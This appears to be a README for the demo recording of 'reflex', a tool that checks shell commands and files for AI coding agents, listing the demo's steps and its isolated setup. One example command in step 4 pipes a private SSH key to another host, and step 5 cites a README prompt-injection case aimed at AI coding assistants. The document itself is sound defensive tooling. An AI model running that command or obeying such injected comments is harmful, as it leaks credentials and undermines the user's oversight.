# Demo recording

`assets/demo.gif` at the top of the main README is recorded with
[VHS](https://github.com/charmbracelet/vhs) from `demo.tape` in this directory. Every line of
output in it is what the commands print; nothing is edited afterwards.

## What it shows

1. `reflex check "git status"`: passes as read-only.
2. `reflex check "git push --force origin main"`: denied by the `force-push-main` rule.
3. `reflex check "terraform apply -auto-approve" --cwd infra/envs/prod`: the local engine asks.
4. `reflex check "cat ~/.ssh/id_ed25519 | ssh host 'cat > k'"`: asked by the `secret-file-read` rule.
5. `reflex scan README.md`: blocks a README with an HTML comment addressed to AI coding assistants
   (the `readme-html-comment-telemetry` case from `setup/injection/golden.json`), exit code 2.
6. `reflex replay claude --since 7d`: the summary for a synthetic 12-command Claude Code transcript.

## No real data

`setup.sh` runs hidden at the start of the tape. It points `HOME` at a new `mktemp -d` directory,
sets `REFLEX_DATA_DIR` inside it, sets `REFLEX_ENGINE=local`, unsets AWS and XDG variables, points
`KUBECONFIG` at `/dev/null` and sets the prompt to `$ `. The README and the transcript that replay
reads are written into that directory, so no real path, username, key or session appears. No
TypeSafe key is used and nothing leaves the machine.

## Re-render

From the repository root:

```sh
brew install vhs          # or see the VHS README for Linux packages; it needs ttyd and ffmpeg
vhs docs/demo/demo.tape   # writes assets/demo.gif
```

Keep the GIF under 2 MB (`ls -l assets/demo.gif`). If the output of a command changes, re-render
rather than editing the GIF, and check a few frames, for example with
`ffmpeg -ss 10 -i assets/demo.gif -frames:v 1 /tmp/frame.png`.
